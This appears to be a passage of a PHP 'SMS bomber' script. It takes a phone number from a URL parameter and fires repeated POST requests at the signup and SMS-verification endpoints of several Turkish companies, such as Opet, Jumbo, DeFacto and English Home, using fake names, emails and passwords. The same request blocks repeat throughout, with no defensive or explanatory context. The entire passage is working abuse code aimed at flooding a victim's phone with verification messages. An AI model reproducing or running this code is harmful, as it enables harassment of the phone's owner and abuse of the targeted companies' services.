curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
